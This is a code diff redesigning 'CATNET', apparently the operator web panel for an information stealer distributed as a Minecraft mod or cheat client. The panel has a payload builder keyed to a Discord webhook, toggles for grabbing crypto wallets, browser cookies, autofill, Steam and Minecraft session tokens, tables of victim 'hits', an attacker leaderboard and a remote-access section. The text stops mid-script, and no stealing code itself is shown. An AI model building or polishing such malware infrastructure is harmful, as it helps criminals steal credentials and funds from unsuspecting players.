@@ -3,103 +3,248 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CATNET</title>
+    <title>CATNET // Secure Access</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;600&family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg: #0a0a0c;
-            --surface: #121216;
-            --border: #23232a;
-            --text: #e0e0e0;
-            --muted: #888;
-            --accent: #ff3333;
-            --accent-dim: #661414;
-            --green: #33ff66;
-            --font: 'Courier New', Courier, monospace;
+            --bg-dark: #050507;
+            --bg-panel: #0d0d12;
+            --bg-input: #14141a;
+            --accent: #ff2a2a;
+            --accent-glow: rgba(255, 42, 42, 0.4);
+            --text-main: #f0f0f5;
+            --text-muted: #7a7a8c;
+            --border: #1f1f2b;
+            --success: #2aff7a;
+            --font-mono: 'Fira Code', monospace;
+            --font-sans: 'Inter', sans-serif;
         }
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            user-select: none;
+        }
+
         body {
-            background-color: var(--bg);
-            color: var(--text);
-            font-family: var(--font);
-            font-size: 14px;
-            line-height: 1.5;
-            display: flex;
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            font-family: var(--font-sans);
             height: 100vh;
             overflow: hidden;
+            background-image: 
+                radial-gradient(circle at 15% 50%, rgba(255, 42, 42, 0.03) 0%, transparent 50%),
+                radial-gradient(circle at 85% 30%, rgba(255, 42, 42, 0.03) 0%, transparent 50%);
         }
+
+        /* Animations */
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        @keyframes pulseGlow { 0% { box-shadow: 0 0 5px var(--accent-glow); } 50% { box-shadow: 0 0 20px var(--accent-glow); } 100% { box-shadow: 0 0 5px var(--accent-glow); } }
+        @keyframes scanline { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
+        @keyframes slideIn { from { transform: translateX(-20px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
+        @keyframes loadingDots { 0% { content: ''; } 25% { content: '.'; } 50% { content: '..'; } 75% { content: '...'; } 100% { content: ''; } }
+
+        /* Login Page */
+        #login-page {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: var(--bg-dark);
+            z-index: 1000;
+            transition: opacity 0.5s ease;
+        }
+        #login-page.hidden {
+            opacity: 0;
+            pointer-events: none;
+        }
+        .login-box {
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            padding: 40px;
+            width: 350px;
+            position: relative;
+            animation: fadeIn 0.5s ease-out;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .login-box::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 2px;
+            background: var(--accent);
+            animation: pulseGlow 2s infinite;
+        }
+        .login-title {
+            font-family: var(--font-mono);
+            font-size: 24px;
+            text-align: center;
+            margin-bottom: 30px;
+            color: var(--accent);
+            letter-spacing: 2px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 12px;
+            color: var(--text-muted);
+            margin-bottom: 5px;
+            font-family: var(--font-mono);
+        }
+        .input-group input {
+            width: 100%;
+            background: var(--bg-input);
+            border: 1px solid var(--border);
+            padding: 12px;
+            color: var(--text-main);
+            font-family: var(--font-mono);
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        .input-group input:focus {
+            border-color: var(--accent);
+        }
+        .login-btn {
+            width: 100%;
+            background: var(--accent);
+            color: var(--bg-dark);
+            border: none;
+            padding: 12px;
+            font-weight: 600;
+            font-family: var(--font-sans);
+            cursor: pointer;
+            transition: all 0.3s;
+            letter-spacing: 1px;
+        }
+        .login-btn:hover {
+            background: #ff4444;
+            box-shadow: 0 0 15px var(--accent-glow);
+        }
+        .login-btn:disabled {
+            background: var(--border);
+            color: var(--text-muted);
+            cursor: not-allowed;
+            box-shadow: none;
+        }
+        .login-status {
+            margin-top: 15px;
+            font-size: 12px;
+            text-align: center;
+            color: var(--text-muted);
+            font-family: var(--font-mono);
+        }
+
+        /* Main App */
+        #app {
+            display: flex;
+            height: 100%;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+        }
+        #app.visible {
+            opacity: 1;
+        }
+
         /* Sidebar */
         .sidebar {
-            width: 250px;
-            background-color: var(--surface);
+            width: 260px;
+            background: var(--bg-panel);
             border-right: 1px solid var(--border);
             display: flex;
             flex-direction: column;
-            overflow-y: auto;
+            z-index: 10;
         }
         .logo {
-            padding: 20px;
-            font-size: 24px;
-            font-weight: bold;
-            color: var(--accent);
+            padding: 25px 20px;
+            font-family: var(--font-mono);
+            font-size: 22px;
+            font-weight: 600;
+            color: var(--text-main);
             border-bottom: 1px solid var(--border);
-            letter-spacing: 2px;
             text-align: center;
+            letter-spacing: 2px;
         }
-        .logo span { color: var(--text); font-weight: normal; font-size: 12px; display: block; letter-spacing: 1px; }
+        .logo span { color: var(--accent); }
         .nav-section {
-            padding: 15px 0;
+            padding: 20px 0;
             border-bottom: 1px solid var(--border);
         }
         .nav-title {
-            color: var(--muted);
-            font-size: 11px;
+            font-size: 10px;
+            color: var(--text-muted);
             text-transform: uppercase;
-            padding: 0 20px;
+            letter-spacing: 1.5px;
+            padding: 0 25px;
             margin-bottom: 10px;
-            letter-spacing: 1px;
         }
         .nav-item {
-            padding: 8px 20px;
+            padding: 12px 25px;
+            font-size: 13px;
+            color: var(--text-muted);
             cursor: pointer;
-            transition: background 0.2s;
+            transition: all 0.2s;
             display: flex;
             align-items: center;
+            border-left: 2px solid transparent;
         }
         .nav-item:hover {
-            background-color: var(--border);
-            color: var(--accent);
+            color: var(--text-main);
+            background: rgba(255,255,255,0.02);
         }
         .nav-item.active {
-            background-color: var(--accent-dim);
-            color: var(--text);
-            border-left: 3px solid var(--accent);
+            color: var(--accent);
+            background: rgba(255, 42, 42, 0.05);
+            border-left-color: var(--accent);
         }
+
         /* Main Content */
-        .main-content {
+        .main {
             flex: 1;
             display: flex;
             flex-direction: column;
             overflow-y: auto;
-            padding: 30px;
+            position: relative;
         }
-        .header-bar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 30px;
-            padding-bottom: 15px;
+        .top-bar {
+            height: 70px;
             border-bottom: 1px solid var(--border);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 40px;
+            background: rgba(13, 13, 18, 0.8);
+            backdrop-filter: blur(10px);
+            position: sticky;
+            top: 0;
+            z-index: 5;
         }
-        .header-title {
-            font-size: 22px;
-            color: var(--text);
+        .page-title {
+            font-family: var(--font-mono);
+            font-size: 18px;
         }
-        .header-user {
-            color: var(--muted);
+        .user-info {
             font-size: 12px;
+            color: var(--text-muted);
+            font-family: var(--font-mono);
         }
-        .header-user span { color: var(--green); }
-        
+        .user-info span { color: var(--accent); }
+
+        .content-area {
+            padding: 40px;
+            max-width: 1200px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        /* Sections */
+        .section { display: none; animation: fadeIn 0.4s ease-out; }
+        .section.active { display: block; }
+
         /* Dashboard Grid */
         .stats-grid {
             display: grid;
@@ -108,548 +253,462 @@
             margin-bottom: 40px;
         }
         .stat-card {
-            background-color: var(--surface);
+            background: var(--bg-panel);
             border: 1px solid var(--border);
-            padding: 20px;
-            text-align: center;
+            padding: 25px;
+            position: relative;
+            overflow: hidden;
         }
-        .stat-card .value {
-            font-size: 28px;
-            color: var(--accent);
+        .stat-card::after {
+            content: '';
+            position: absolute;
+            bottom: 0; left: 0; width: 100%; height: 2px;
+            background: var(--accent);
+            transform: scaleX(0);
+            transform-origin: left;
+            transition: transform 0.3s;
+        }
+        .stat-card:hover::after { transform: scaleX(1); }
+        .stat-val {
+            font-family: var(--font-mono);
+            font-size: 32px;
+            color: var(--text-main);
             margin-bottom: 5px;
         }
-        .stat-card .label {
-            font-size: 12px;
-            color: var(--muted);
+        .stat-label {
+            font-size: 11px;
+            color: var(--text-muted);
             text-transform: uppercase;
+            letter-spacing: 1px;
         }
 
-        /* Hits Table */
-        .table-container {
-            background-color: var(--surface);
+        /* Tables */
+        .panel {
+            background: var(--bg-panel);
             border: 1px solid var(--border);
-            margin-bottom: 40px;
-            overflow-x: auto;
+            margin-bottom: 30px;
         }
-        .table-header {
-            padding: 15px;
+        .panel-header {
+            padding: 20px;
             border-bottom: 1px solid var(--border);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+            font-family: var(--font-mono);
+            font-size: 14px;
         }
-        .table-header h3 { font-size: 16px; }
         table {
             width: 100%;
             border-collapse: collapse;
             text-align: left;
         }
         th {
-            background-color: var(--bg);
-            color: var(--muted);
             font-size: 11px;
+            color: var(--text-muted);
             text-transform: uppercase;
-            padding: 10px 15px;
+            padding: 15px 20px;
             border-bottom: 1px solid var(--border);
-            white-space: nowrap;
+            background: rgba(0,0,0,0.2);
         }
         td {
-            padding: 15px;
-            border-bottom: 1px solid var(--border);
+            padding: 15px 20px;
             font-size: 13px;
-            white-space: nowrap;
+            border-bottom: 1px solid var(--border);
+            font-family: var(--font-mono);
         }
         tr:last-child td { border-bottom: none; }
-        .no-hits {
+        .empty-state {
             text-align: center;
-            padding: 30px;
-            color: var(--muted);
+            color: var(--text-muted);
+            padding: 40px !important;
+            font-style: italic;
         }
 
-        /* Leaderboard */
-        .leaderboard-container {
-            background-color: var(--surface);
-            border: 1px solid var(--border);
-            margin-bottom: 40px;
+        /* Builder Section */
+        .builder-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 20px;
         }
-        .leaderboard-item {
-            display: flex;
-            padding: 15px;
-            border-bottom: 1px solid var(--border);
-            align-items: center;
-        }
-        .leaderboard-item:last-child { border-bottom: none; }
-        .lb-rank {
-            width: 40px;
-            font-weight: bold;
-            color: var(--muted);
-        }
-        .lb-rank.top { color: var(--accent); }
-        .lb-user {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-        }
-        .lb-user .name { font-weight: bold; }
-        .lb-user .hash { font-size: 11px; color: var(--muted); }
-        .lb-value {
-            color: var(--green);
-            font-weight: bold;
-            text-align: right;
-        }
-
-        /* Builder / Settings / Features layout */
-        .panel {
-            background-color: var(--surface);
-            border: 1px solid var(--border);
-            padding: 20px;
-            margin-bottom: 20px;
-        }
-        .panel-title {
-            font-size: 16px;
-            color: var(--accent);
-            margin-bottom: 15px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid var(--border);
-        }
-        
-        /* Builder Specific */
         .mod-card {
-            background-color: var(--bg);
+            background: var(--bg-panel);
+            border: 1px solid var(--border);
+            padding: 20px;
+            transition: border-color 0.3s;
+        }
+        .mod-card:hover { border-color: var(--text-muted); }
+        .mod-card h4 { font-family: var(--font-mono); font-size: 15px; margin-bottom: 10px; }
+        .mod-card p { font-size: 12px; color: var(--text-muted); margin-bottom: 15px; }
+        
+        .input-field {
+            width: 100%;
+            background: var(--bg-input);
             border: 1px solid var(--border);
             padding: 15px;
-            margin-bottom: 15px;
-        }
-        .mod-card h4 { color: var(--text); margin-bottom: 5px; }
-        .mod-card p { font-size: 12px; color: var(--muted); margin-bottom: 10px; }
-        .download-btn {
-            display: inline-block;
-            background-color: var(--accent-dim);
-            color: var(--accent);
-            padding: 8px 15px;
-            text-decoration: none;
-            border: 1px solid var(--accent);
-            font-size: 12px;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .download-btn:hover {
-            background-color: var(--accent);
-            color: var(--bg);
-        }
-
-        /* Settings specific */
-        .setting-row {
-            display: flex;
-            align-items: center;
-            margin-bottom: 15px;
-        }
-        .setting-row label {
-            flex: 1;
-            font-size: 13px;
-        }
-        .setting-row input[type="text"] {
-            flex: 1;
-            background-color: var(--bg);
-            border: 1px solid var(--border);
-            color: var(--text);
-            padding: 8px;
-            font-family: var(--font);
+            color: var(--text-main);
+            font-family: var(--font-mono);
             outline: none;
+            margin-bottom: 20px;
+            transition: border-color 0.3s;
         }
-        .setting-row input[type="text"]:focus {
-            border-color: var(--accent);
-        }
-        /* Custom Toggle Switch */
-        .switch {
-            position: relative;
-            display: inline-block;
-            width: 40px;
-            height: 20px;
-        }
-        .switch input { opacity: 0; width: 0; height: 0; }
-        .slider {
-            position: absolute;
+        .input-field:focus { border-color: var(--accent); }
+        
+        .action-btn {
+            background: var(--accent);
+            color: var(--bg-dark);
+            border: none;
+            padding: 15px 30px;
+            font-family: var(--font-sans);
+            font-weight: 600;
             cursor: pointer;
-            top: 0; left: 0; right: 0; bottom: 0;
-            background-color: var(--border);
-            transition: .4s;
+            width: 100%;
+            transition: all 0.3s;
         }
-        .slider:before {
-            position: absolute;
-            content: "";
-            height: 14px;
-            width: 14px;
-            left: 3px;
-            bottom: 3px;
-            background-color: var(--text);
-            transition: .4s;
-        }
-        input:checked + .slider {
-            background-color: var(--accent);
-        }
-        input:checked + .slider:before {
-            transform: translateX(20px);
-            background-color: var(--bg);
-        }
+        .action-btn:hover { background: #ff4444; box-shadow: 0 0 15px var(--accent-glow); }
+        .action-btn:disabled { background: var(--border); color: var(--text-muted); cursor: not-allowed; box-shadow: none; }
 
-        /* Features specific */
-        ul.features-list {
-            list-style: none;
-        }
-        ul.features-list li {
-            padding: 8px 0;
-            border-bottom: 1px dashed var(--border);
-            font-size: 13px;
-        }
-        ul.features-list li:last-child { border-bottom: none; }
-        ul.features-list li::before {
-            content: "> ";
-            color: var(--accent);
-        }
-        
-        /* Remote specific */
-        .remote-panel {
-            background-color: var(--bg);
-            border: 1px dashed var(--accent);
-            padding: 20px;
-            text-align: center;
-            margin-top: 15px;
-        }
-        .remote-panel .id { font-family: var(--font); color: var(--green); font-size: 16px; margin: 10px 0; }
-
-        /* Hide sections by default, JS handles visibility */
-        .section { display: none; }
-        .section.active { display: block; }
-        
-        /* Terminal log for the builder output */
-        #builder-log {
-            background-color: #000;
-            color: var(--green);
-            padding: 10px;
+        .terminal {
+            background: #000;
             border: 1px solid var(--border);
+            padding: 20px;
+            font-family: var(--font-mono);
             font-size: 12px;
-            margin-top: 10px;
+            color: var(--success);
+            min-height: 150px;
+            margin-top: 20px;
             display: none;
             white-space: pre-wrap;
+            position: relative;
+            overflow: hidden;
+        }
+        .terminal::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(to bottom, rgba(255,255,255,0.02) 50%, transparent 50%);
+            background-size: 100% 4px;
+            pointer-events: none;
+            z-index: 2;
         }
     </style>
 </head>
 <body>
 
-    <!-- Sidebar -->
-    <div class="sidebar">
-        <div class="logo">
-            CATNET
-            <span>meow protocol</span>
-        </div>
-
-        <div class="nav-section">
-            <div class="nav-title">Overview</div>
-            <div class="nav-item active" onclick="showSection('dashboard')">Dashboard</div>
-            <div class="nav-item" onclick="showSection('settings')">Settings</div>
-            <div class="nav-item" onclick="showSection('account')">Account</div>
-            <div class="nav-item" onclick="showSection('features')">Features</div>
-        </div>
-
-        <div class="nav-section">
-            <div class="nav-title">Stealer</div>
-            <div class="nav-item" onclick="showSection('builder')">Builder</div>
-            <div class="nav-item" onclick="showSection('leaderboard')">Leaderboard</div>
-        </div>
-
-        <div class="nav-section">
-            <div class="nav-title">Remote</div>
-            <div class="nav-item" onclick="showSection('remote')">Overview</div>
+    <!-- LOGIN PAGE -->
+    <div id="login-page">
+        <div class="login-box">
+            <div class="login-title">CATNET AUTH</div>
+            <div class="input-group">
+                <label>Username</label>
+                <input type="text" id="login-user" placeholder="Enter username">
+            </div>
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="login-pass" placeholder="Enter password">
+            </div>
+            <div class="input-group">
+                <label>Webhook (For Auth)</label>
+                <input type="text" id="login-webhook" placeholder="https://discord.com/api/webhooks/...">
+            </div>
+            <button class="login-btn" id="login-btn" onclick="handleLogin()">AUTHENTICATE</button>
+            <div class="login-status" id="login-status"></div>
         </div>
     </div>
 
-    <!-- Main Content -->
-    <div class="main-content">
-        
-        <!-- Top Header -->
-        <div class="header-bar">
-            <div class="header-title" id="page-title">Dashboard</div>
-            <div class="header-user">Logged in as: <span>user</span></div>
-        </div>
-
-        <!-- DASHBOARD SECTION -->
-        <div id="dashboard" class="section active">
-            <div class="stats-grid">
-                <div class="stat-card">
-                    <div class="value">0</div>
-                    <div class="label">Total Hits</div>
-                </div>
-                <div class="stat-card">
-                    <div class="value">0</div>
-                    <div class="label">Hits (24h)</div>
-                </div>
-                <div class="stat-card">
-                    <div class="value">0</div>
-                    <div class="label">Last Hit</div>
-                </div>
-                <div class="stat-card">
-                    <div class="value">0</div>
-                    <div class="label">Live Connections</div>
-                </div>
+    <!-- MAIN APP -->
+    <div id="app">
+        <div class="sidebar">
+            <div class="logo">CAT<span>NET</span></div>
+            
+            <div class="nav-section">
+                <div class="nav-title">System</div>
+                <div class="nav-item active" onclick="showSection('dashboard', this)">Dashboard</div>
+                <div class="nav-item" onclick="showSection('builder', this)">Builder</div>
+                <div class="nav-item" onclick="showSection('settings', this)">Settings</div>
             </div>
-
-            <div class="table-container">
-                <div class="table-header">
-                    <h3>Recent Hits</h3>
-                </div>
-                <table>
-                    <thead>
-                        <tr>
-                            <th>Client</th>
-                            <th>IP</th>
-                            <th>Environment</th>
-                            <th>Wallets</th>
-                            <th>Passwords</th>
-                            <th>Cookies</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <tr>
-                            <td colspan="6" class="no-hits">No hits yet.</td>
-                        </tr>
-                    </tbody>
-                </table>
+            
+            <div class="nav-section">
+                <div class="nav-title">Intel</div>
+                <div class="nav-item" onclick="showSection('hits', this)">Hits</div>
+                <div class="nav-item" onclick="showSection('leaderboard', this)">Leaderboard</div>
             </div>
         </div>
 
-        <!-- BUILDER SECTION -->
-        <div id="builder" class="section">
-            <div class="panel">
-                <div class="panel-title">Build Configuration</div>
+        <div class="main">
+            <div class="top-bar">
+                <div class="page-title" id="current-page">Dashboard</div>
+                <div class="user-info">Operator: <span id="display-user">user</span></div>
+            </div>
+
+            <div class="content-area">
                 
-                <div class="mod-card">
-                    <h4>CATNET Mod</h4>
-                    <p>Works on Minecraft 1.21 – 1.21.11</p>
-                </div>
-                <div class="mod-card">
-                    <h4>KryptonClient</h4>
-                    <p>Cheat client · Minecraft 1.21.1 only</p>
+                <!-- DASHBOARD -->
+                <div id="dashboard" class="section active">
+                    <div class="stats-grid">
+                        <div class="stat-card">
+                            <div class="stat-val">0</div>
+                            <div class="stat-label">Total Hits</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-val">0</div>
+                            <div class="stat-label">Hits (24h)</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-val">0</div>
+                            <div class="stat-label">Last Hit</div>
+                        </div>
+                        <div class="stat-card">
+                            <div class="stat-val">0</div>
+                            <div class="stat-label">Live Connections</div>
+                        </div>
+                    </div>
+
+                    <div class="panel">
+                        <div class="panel-header">Recent Activity</div>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Client</th>
+                                    <th>IP</th>
+                                    <th>Environment</th>
+                                    <th>Wallets</th>
+                                    <th>Passwords</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr><td colspan="5" class="empty-state">No recent activity found.</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
                 </div>
 
-                <div style="margin-top: 20px;">
-                    <label style="display:block; margin-bottom:10px; font-size:12px; color:var(--muted);">Primary Webhook URL</label>
-                    <input type="text" id="webhook-input" placeholder="https://discord.com/api/webhooks/..." style="width:100%; background:var(--bg); border:1px solid var(--border); color:var(--text); padding:10px; margin-bottom:15px; font-family:var(--font);">
-                    
-                    <button class="download-btn" onclick="generateOutput()" style="width:100%; text-align:center;">Generate Payload</button>
-                    
-                    <div id="builder-log">[SYSTEM] Initializing build sequence...
-[SYSTEM] Fetching payload from configured endpoint...
-[SYSTEM] Injecting webhook...
-[SYSTEM] Compiling executable...
-[SYSTEM] Build complete. File ready for download.
-Download: https://your-server.com/catnet_payload.exe</div>
+                <!-- BUILDER -->
+                <div id="builder" class="section">
+                    <div class="builder-grid">
+                        <div class="mod-card">
+                            <h4>CATNET Mod</h4>
+                            <p>Works on Minecraft 1.21 – 1.21.11</p>
+                        </div>
+                        <div class="mod-card">
+                            <h4>KryptonClient</h4>
+                            <p>Cheat client · Minecraft 1.21.1 only</p>
+                        </div>
+                    </div>
+
+                    <div style="margin-top: 30px;">
+                        <label style="display:block; margin-bottom:10px; font-family:var(--font-mono); font-size:12px; color:var(--text-muted);">TARGET WEBHOOK URL</label>
+                        <input type="text" id="build-webhook" class="input-field" placeholder="https://discord.com/api/webhooks/...">
+                        <button class="action-btn" id="build-btn" onclick="generatePayload()">GENERATE PAYLOAD</button>
+                        
+                        <div class="terminal" id="build-log"></div>
+                    </div>
                 </div>
+
+                <!-- SETTINGS -->
+                <div id="settings" class="section">
+                    <div class="panel">
+                        <div class="panel-header">Configuration</div>
+                        <div style="padding: 20px;">
+                            <p style="color: var(--text-muted); font-size: 13px; margin-bottom: 20px;">Settings applied to generated payloads.</p>
+                            <div style="display: flex; justify-content: space-between; padding: 15px 0; border-bottom: 1px solid var(--border);">
+                                <span>Desktop Crypto Wallets</span>
+                                <input type="checkbox" checked>
+                            </div>
+                            <div style="display: flex; justify-content: space-between; padding: 15px 0; border-bottom: 1px solid var(--border);">
+                                <span>Browser Cookies</span>
+                                <input type="checkbox" checked>
+                            </div>
+                            <div style="display: flex; justify-content: space-between; padding: 15px 0;">
+                                <span>Minecraft Session</span>
+                                <input type="checkbox" checked>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- HITS -->
+                <div id="hits" class="section">
+                    <div class="panel">
+                        <div class="panel-header">All Hits</div>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Client</th>
+                                    <th>IP</th>
+                                    <th>Environment</th>
+                                    <th>Wallets</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr><td colspan="4" class="empty-state">No data available.</td></tr>
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+
+                <!-- LEADERBOARD -->
+                <div id="leaderboard" class="section">
+                    <div class="panel">
+                        <div class="panel-header">Top Performers</div>
+                        <div style="padding: 20px; display: flex; border-bottom: 1px solid var(--border);">
+                            <div style="width: 50px; color: var(--accent); font-weight: bold; font-family: var(--font-mono);">#1</div>
+                            <div style="flex: 1;">
+                                <div style="font-weight: 600;">usecode-promo</div>
+                                <div style="font-size: 12px; color: var(--text-muted);">65770 total</div>
+                            </div>
+                        </div>
+                        <div style="padding: 20px; display: flex; border-bottom: 1px solid var(--border);">
+                            <div style="width: 50px; color: var(--text-muted); font-weight: bold; font-family: var(--font-mono);">#2</div>
+                            <div style="flex: 1;">
+                                <div style="font-weight: 600;">DO dot</div>
+                                <div style="font-size: 12px; color: var(--text-muted);">602,100 total</div>
+                            </div>
+                        </div>
+                        <div style="padding: 20px; display: flex;">
+                            <div style="width: 50px; color: var(--text-muted); font-weight: bold; font-family: var(--font-mono);">#3</div>
+                            <div style="flex: 1;">
+                                <div style="font-weight: 600;">Love</div>
+                                <div style="font-size: 12px; color: var(--text-muted);">591,800 total</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
             </div>
         </div>
-
-        <!-- SETTINGS SECTION -->
-        <div id="settings" class="section">
-            <div class="panel">
-                <div class="panel-title">Stealer Toggles</div>
-                <div class="setting-row">
-                    <label>Desktop Crypto Wallets</label>
-                    <label class="switch"><input type="checkbox" checked><span class="slider"></span></label>
-                </div>
-                <div class="setting-row">
-                    <label>Desktop file steal</label>
-                    <label class="switch"><input type="checkbox"><span class="slider"></span></label>
-                </div>
-                <div class="setting-row">
-                    <label>Steam token</label>
-                    <label class="switch"><input type="checkbox" checked><span class="slider"></span></label>
-                </div>
-                <div class="setting-row">
-                    <label>Web Crypto Wallets</label>
-                    <label class="switch"><input type="checkbox" checked><span class="slider"></span></label>
-                </div>
-                <div class="setting-row">
-                    <label>Minecraft launcher data</label>
-                    <label class="switch"><input type="checkbox" checked><span class="slider"></span></label>
-                </div>
-                <div class="setting-row">
-                    <label>Browser Cookies</label>
-                    <label class="switch"><input type="checkbox" checked><span class="slider"></span></label>
-                </div>
-                <div class="setting-row">
-                    <label>Autofill data</label>
-                    <label class="switch"><input type="checkbox" checked><span class="slider"></span></label>
-                </div>
-            </div>
-        </div>
-
-        <!-- ACCOUNT SECTION -->
-        <div id="account" class="section">
-            <div class="panel">
-                <div class="panel-title">Account Information</div>
-                <p style="color:var(--muted); font-size:13px; margin-bottom:15px;">Manage your CATNET account details.</p>
-                <div class="setting-row">
-                    <label>Username</label>
-                    <input type="text" value="user" disabled style="color:var(--muted);">
-                </div>
-            </div>
-        </div>
-
-        <!-- FEATURES SECTION -->
-        <div id="features" class="section">
-            <div class="panel">
-                <div class="panel-title">Core Capabilities</div>
-                <ul class="features-list">
-                    <li>Silent operation</li>
-                    <li>Full PC grabber</li>
-                    <li>Encrypted remote connection</li>
-                    <li>Session tokens (Minecraft)</li>
-                    <li>IP addresses</li>
-                    <li>Screenshot capture</li>
-                    <li>Discord Token + Telegram</li>
-                    <li>Crypto wallets (HW + Web)</li>
-                    <li>Lunar / Feather / Essential grabbers</li>
-                    <li>Passwords & cookies</li>
-                    <li>Run as .EXE</li>
-                    <li>Full PC access & file access</li>
-                </ul>
-            </div>
-        </div>
-
-        <!-- LEADERBOARD SECTION -->
-        <div id="leaderboard" class="section">
-            <div class="leaderboard-container">
-                <div class="table-header">
-                    <h3>Top 10 Performers — All Time</h3>
-                </div>
-                
-                <div class="leaderboard-item">
-                    <div class="lb-rank top">#1</div>
-                    <div class="lb-user"><span class="name">U</span><span class="hash">usecode-promo</span></div>
-                    <div class="lb-value">65770 total</div>
-                </div>
-                <div class="leaderboard-item">
-                    <div class="lb-rank top">#2</div>
-                    <div class="lb-user"><span class="name">D</span><span class="hash">DO dot</span></div>
-                    <div class="lb-value">602,100 total</div>
-                </div>
-                <div class="leaderboard-item">
-                    <div class="lb-rank top">#3</div>
-                    <div class="lb-user"><span class="name">L</span><span class="hash">Love</span></div>
-                    <div class="lb-value">591,800 total</div>
-                </div>
-                <div class="leaderboard-item">
-                    <div class="lb-rank">#4</div>
-                    <div class="lb-user"><span class="name">N</span><span class="hash">Nexus</span></div>
-                    <div class="lb-value">56895 total</div>
-                </div>
-                <div class="leaderboard-item">
-                    <div class="lb-rank">#5</div>
-                    <div class="lb-user"><span class="name">E</span><span class="hash">exe</span></div>
-                    <div class="lb-value">5210,900 total</div>
-                </div>
-                <div class="leaderboard-item">
-                    <div class="lb-rank">#6</div>
-                    <div class="lb-user"><span class="name">A</span><span class="hash">Anonymous</span></div>
-                    <div class="lb-value">493,300 total</div>
-                </div>
-                <div class="leaderboard-item">
-                    <div class="lb-rank">#7</div>
-                    <div class="lb-user"><span class="name">C</span><span class="hash">code</span></div>
-                    <div class="lb-value">471,400 total</div>
-                </div>
-                <div class="leaderboard-item">
-                    <div class="lb-rank">#8</div>
-                    <div class="lb-user"><span class="name">R</span><span class="hash">rookie</span></div>
-                    <div class="lb-value">4610,200 total</div>
-                </div>
-                <div class="leaderboard-item">
-                    <div class="lb-rank">#9</div>
-                    <div class="lb-user"><span class="name">A</span><span class="hash">Anonymous</span></div>
-                    <div class="lb-value">45211 total</div>
-                </div>
-                <div class="leaderboard-item">
-                    <div class="lb-rank">#10</div>
-                    <div class="lb-user"><span class="name">I</span><span class="hash">Ibrahim</span></div>
-                    <div class="lb-value">4417,900 total</div>
-                </div>
-            </div>
-        </div>
-
-        <!-- REMOTE SECTION -->
-        <div id="remote" class="section">
-            <div class="panel">
-                <div class="panel-title">Remote Access</div>
-                <p style="color:var(--muted); font-size:13px;">Your ID: 92e88930-383a-4c6a-bebf-8cafd62c62f6</p>
-                <div class="remote-panel">
-                    <h4 style="color:var(--text); margin-bottom:10px;">Remote Control Panel</h4>
-                    <p style="color:var(--muted); font-size:12px;">1.0 FPS ⏱ 120 ms</p>
-                    <div style="margin-top:15px; font-size:12px;">Connected clients: <span style="color:var(--green);">0 connected</span></div>
-                </div>
-            </div>
-        </div>
-
     </div>
 
     <script>
-        // Navigation logic
-        function showSection(sectionId) {
-            // Hide all sections
-            document.querySelectorAll('.section').forEach(sec => {
-                sec.classList.remove('active');
-            });
-            // Remove active state from nav items
-            document.querySelectorAll('.nav-item').forEach(nav => {
-                nav.classList.remove('active');
-            });
-            
-            // Show target section
-            const targetSection = document.getElementById(sectionId);
-            if (targetSection) {
-                targetSection.classList.add('active');
-            }
+        // --- LOGIN LOGIC ---
+        async function handleLogin() {
+            const user = document.getElementById('login-user').value;
+            const pass = document.getElementById('login-pass').value;
+            const webhook = document.getElementById('login-webhook').value;
+            const btn = document.getElementById('login-btn');
+            const status = document.getElementById('login-status');
 
-            // Highlight clicked nav item
-            const clickedNav = Array.from(document.querySelectorAll('.nav-item')).find(nav => 
-                nav.getAttribute('onclick') === `showSection('${sectionId}')`
-            );
-            if (clickedNav) {
-                clickedNav.classList.add('active');
-            }
-
-            // Update page title
-            const titleMap = {
-                'dashboard': 'Dashboard',
-                'builder': 'Builder',
-                'settings': 'Settings',
-                'account': 'Account',
-                'features': 'Features',
-                'leaderboard': 'Leaderboard',
-                'remote': 'Remote Access'
-            };
-            document.getElementById('page-title').innerText = titleMap[sectionId] || 'CATNET';
-        }
-
-        // Builder output logic
-        function generateOutput() {
-            const log = document.getElementById('builder-log');
-            const webhook = document.getElementById('webhook-input').value.trim();
-            
